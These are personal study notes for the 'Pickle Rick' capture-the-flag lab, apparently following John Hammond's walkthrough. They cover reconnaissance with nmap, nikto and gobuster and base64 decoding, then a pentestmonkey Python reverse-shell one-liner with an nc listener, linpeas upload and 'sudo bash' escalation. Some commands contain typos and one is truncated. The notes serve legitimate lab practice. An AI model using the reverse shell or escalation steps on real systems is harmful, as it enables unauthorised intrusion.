# Pen-testing Set up demonstrated by John Hammond for the Pickle rick CTF

- step 1: make directory for resources
- Step 2: subl README.md
  - Add ip as export to note pad
    - export IP={IP}
    - namp results
- Step 3: create namp directory
  - nmap -sC -sV -oN nmap/initial
- Grab IP address

## Set up Nikto scanner
  - export IP={IP}
  - nikto -h http://$IP | tee nikto.log

# Set up gobuster
  - export IP
  - gobuster -u http://$IP -w /opt/rockyou.txt
  - gobuster -u http://$IP -w /opt/directory-list-2.3-medium.txt -x php.sh.txt, cgi, html, js, css, py


## Investigation options
- nmap
- could use hydra to brute force password
- gobuster
- investigate website for clues
- grep . clue.txt // grep -R . (return all files in folder - look at source code)

## Base64 string - add 'base64 -d' to get through the layers of the onion of base64
  - echo {base 64} | base64 -d | base64 -d

## Bypassing blacklist
- test what languages will work in text box
- pentestmonkey (reverse shell cheatsheet)
  - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{Change to my IP}",{Change to port 9999}))
- nc -lnvp 9999
- run above script in text box
### Stabalize shell
- github.com/johnHammond/poor-mans-pentest
- stabilize_shell3.sh
- upload_file_nc.sh /opt/linpeas.sh

- shm$ chmod +x linpeas.sh
- ./linpeas.sh
- sudo bash

  - identify my IP address
    - ip addr show tun0

## Task list
1. What is the first ingredient Rick needs?

2. Whats the second ingredient Rick needs?

3. Whats the final ingredient Rick needs?